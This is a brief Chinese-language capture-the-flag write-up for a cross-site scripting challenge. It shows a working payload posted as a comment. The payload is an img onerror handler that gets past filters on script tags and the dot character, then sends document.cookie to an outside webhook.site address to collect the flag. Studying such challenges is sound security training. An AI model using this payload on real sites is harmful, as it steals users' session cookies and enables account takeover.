使用Webhook获取接受cookie的平台。

需要绕过对`<script>`标签和`.`(点)的过滤。

在comment中提交以下内容：

```javascript
<img src=x onerror="window['location']='https://webhook'+String['fromCharCode'](46)+'site/a1079fb3-b8f3-4141-97ec-8ed50f9cecd1?c='+document['cookie']">
```

在Webhook中查看请求及cookie，得到FLAG。